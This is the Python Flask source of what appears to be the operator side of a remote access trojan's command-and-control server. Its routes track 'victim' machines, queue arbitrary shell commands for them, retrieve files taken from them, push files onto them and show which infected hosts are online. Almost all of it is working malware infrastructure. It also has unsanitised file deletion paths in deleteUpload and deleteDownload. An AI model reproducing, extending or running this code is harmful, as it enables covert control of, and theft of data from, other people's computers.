#!/usr/bin/python
# coding: UTF-8
from functools import wraps
from flask import Module, session, request, redirect, url_for, render_template, make_response
from werkzeug import secure_filename

import random
import time
import hashlib
import json
import re
import os

import payload
import config
from models import victim, action, upload, download

server = Module(__name__)

def md5(s):
    return hashlib.md5(s).hexdigest()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('login'):
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

@server.route('/')
@login_required
def index():
    return render_template('index.html')

@server.route('/setCmd', methods=['POST'])
@login_required
def setCmd():
    signature = request.form.get('signature').strip()
    cmd = request.form.get('cmd').strip()
    a = action.action()
    p = payload.payload()
    pid = md5(str(time.time())+config.SECRET_KEY+signature+cmd+str(random.random()))
    exploit = p.cmd(cmd)
    a.add(pid, signature, '[cmd] '+cmd, exploit)
    return pid

@server.route('/getResult', methods=['GET', 'POST'])
@login_required
def getResult():
    signature = request.values['signature']
    pid = request.values['pid']
    a = action.action()
    data = a.get(pid)
    if data and data.get('feedback'):
        return data['feedback'].decode('base64')
    else:
        return make_response('error', 500)

@server.route('/checkOnline', methods=['POST'])
@login_required
def checkOnline():
    signature = request.form.get('signature')
    c = victim.victim()
    if c.checkalive(signature):
        return 'success'
    else:
        return 'error'

@server.route('/getOnline', methods=['GET', 'POST'])
@login_required
def getOnline():
    c = victim.victim()
    data = c.alives()
    if data:
        for i in xrange(len(data)):
            data[i]['id'] = i
            data[i]['alive_time'] = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(data[i]['alive_time']))
        return json.dumps(data)
    else:
        return 'All offline...'

@server.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('password') == config.PASSWORD:
            session['login'] = True
            return redirect(url_for('index'))
    return render_template('login.html')

@server.route('/logout')
def logout():
    # remove the username from the session if it's there
    session.pop('login', None)
    return redirect(url_for('index'))

@server.route('/getUploadedFileByPid', methods=['GET'])
@login_required
def getUploadedFileByPid():
    pid = request.args.get('pid')
    if not pid:
        return 'error'
    pattern = r"^[0-9a-f]{32}$"
    if not re.match(pattern, pid):
        return 'error'
    #get filename by pid
    a = upload.upload()
    result = a.getbypid(pid)
    filename = result['filename']
    originalname = result['originalname']
    if not os.path.exists(config.upload_dir+os.sep+filename):
        return 'error'
    with open(config.upload_dir+os.sep+filename, 'r') as f:
        data = f.read()
    #TODO: change content-type and use originalname
    return data

@server.route('/getUploadedFileByName', methods=['GET'])
@login_required
def getUploadedFileByName():
    filename = request.args.get('filename')
    if not filename:
        return 'error'
    pattern = r"^[0-9a-f]{32}$"
    if not re.match(pattern, filename):
        return 'error'
    if not os.path.exists(config.upload_dir+os.sep+filename):
        return 'error'
    with open(config.upload_dir+os.sep+filename, 'r') as f:
        data = f.read()
    return data

@server.route('/setUpload', methods=['POST'])
@login_required
def setUpload():
    signature = request.form.get('signature').strip()
    filePath = request.form.get('filePath').strip()
    a = action.action()
    p = payload.payload()
    pid = md5(str(time.time())+config.SECRET_KEY+signature+filePath+str(random.random()))
    exploit = p.upload(filePath)
    a.add(pid, signature, '[upload] '+filePath, exploit)
    return pid

@server.route('/setDownload', methods=['POST'])
@login_required
def setDownload():
    signature = request.form.get('signature').strip()
    originalname = request.form.get('filename').strip()
    savePath = request.form.get('savePath').strip()
    a = action.action()
    p = payload.payload()
    d = download.download()
    filename = d.getbyname(originalname)['filename']
    pid = md5(str(time.time())+config.SECRET_KEY+signature+originalname+savePath+str(random.random()))
    exploit = p.download(filename, savePath)
    a.add(pid, signature, '[download] '+originalname+'('+filename+')'+' [savepath] '+savePath, exploit)
    return pid

@server.route('/uploadToServer', methods=['POST'])
@login_required
def uploadToServer():
    f = request.files['file']
    if f:
        originalname = secure_filename(f.filename)
        data = f.read()
        filename = hashlib.md5(data).hexdigest()
        with open(config.download_dir+os.sep+filename, 'w') as fp:
            fp.write(data)
        d = download.download()
        d.add(originalname, filename)
        return '<p style="color:white">Upload success <a style="color:white" target="_Blank" href="download?filename='+filename+'">'+filename+'</a></p>'
    return 'error'

@server.route('/showDownloads', methods=['GET'])
@login_required
def showDownloads():
    d = download.download()
    files = d.getlist()
    if files:
        for i in xrange(len(files)):
            files[i]['id'] = i
        return json.dumps(files)
    return '[]'
@server.route("/download", methods=['GET'])
def download_controller():
    filename = request.args.get('filename')
    if not filename:
        return 'error'
    pattern = r"^[0-9a-f]{32}$"
    if not re.match(pattern, filename):
        return 'error'
    if not os.path.exists(config.download_dir+os.sep+filename):
        return 'error'
    with open(config.download_dir+os.sep+filename, 'r') as f:
        data = f.read()
    return data

@server.route("/upFile", methods=['GET'])
def upFile():
    return render_template('upfile.html')

@server.route('/showUploads', methods=['POST'])
@login_required
def showUploads():
    u = upload.upload()
    signature = request.form.get('signature').strip()
    files = u.getbyclient(signature)
    if files:
        for i in xrange(len(files)):
            files[i]['id'] = i
        return json.dumps(files)
    return '[]'

@server.route('/deleteSession', methods=['POST'])
@login_required
def deleteSession():
    signature = request.form.get('signature').strip()
    v = victim.victim()
    v.delete(signature)
    return 'success'

@server.route('/deleteUpload', methods=['POST'])
@login_required
def deleteUpload():
    filename = request.form.get('filename').strip()
    u = upload.upload()
    u.delete(filename)
    os.remove(config.upload_dir+os.sep+filename)
    return 'success'

@server.route('/deleteDownload', methods=['POST'])
@login_required
def deleteDownload():
    filename = request.form.get('filename').strip()
    u = download.download()
    u.delete(filename)
    os.remove(config.download_dir+os.sep+filename)
    return 'success'
